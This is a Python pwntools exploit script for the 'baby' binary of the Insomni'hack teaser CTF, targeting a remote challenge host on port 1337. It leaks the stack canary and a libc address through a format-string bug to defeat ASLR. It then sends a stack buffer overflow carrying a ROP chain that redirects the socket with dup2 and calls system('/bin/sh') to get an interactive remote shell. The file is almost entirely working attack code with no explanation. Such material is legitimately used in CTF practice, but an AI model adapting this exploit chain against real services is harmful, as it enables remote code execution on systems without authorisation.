from pwn import *
import sys
import IPython
context(arch='amd64')

b = ELF('./baby')

if len(sys.argv) > 1:
    DEBUG = True
    print "Debug Mode Set"
else:
    DEBUG = False

if DEBUG:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    rem = remote('localhost', 1337)
else:
    libc = ELF('libc.so')
    rem = remote('baby.teaser.insomnihack.ch', 1337)

def recvMenu(rem):
    rem.recvuntil("Your choice > ")
    return

def sof(rem, buf):
    rem.send("1\n")
    print rem.recvuntil("? ")
    print "Sending: " + str(len(buf))
    rem.send(str(len(buf)) + '\n')
    rem.send(buf)


def leakAddrAtStack(r, offset,bytesToRead):
    r.send("2\n")
    r.recvuntil("Your format > ")
    r.send("%" + str(offset) + "$lx\n")
    address = r.recv(bytesToRead)
    r.recvuntil("Your format > ")
    r.send("\n")
    return int("0x" + address, 16)

def printStack(rem, num, s):
    rem.send("2\n")
    for i in range(1, num):
        rem.recvuntil("Your format > ")
        rem.send("%" + str(i) + "$lx\n")
        address = rem.recv(12)
        print str(i) + ": 0x" + address
        if s in address:
            print str(i) + ": 0x" + address
            break

#part1
recvMenu(rem)
canary_offset = 138
canary = leakAddrAtStack(rem, canary_offset, 16)
print "Canary = " + str(hex(canary))

libc_start_main_240_offset = 158
libc_start_main_240 = leakAddrAtStack(rem, libc_start_main_240_offset, 16)
print "Leaked libc address  = " + str(hex(libc_start_main_240))
print "Offset = " + str(hex(libc.symbols['__libc_start_main']+240))
libc_base = libc_start_main_240 - (libc.symbols['__libc_start_main']+240)
print "Libc base = " + str(hex(libc_base))

#part2
libc.address = libc_base
IPython.embed()
rop = ROP(libc)
rop.raw('AAAAAAAA') #overwrite ebp
rop.call('dup2', [4, 0])
rop.call('dup2', [4, 1])
rop.system(next(libc.search('/bin/sh\x00')))
print rop.dump()
#0x408 'A's because buffer is at 0x410 from ebp therefore 0x408 from canary
shellcode = 'A'*0x408 + p64(canary) + str(rop)
sof(rem, shellcode)
rem.interactive()
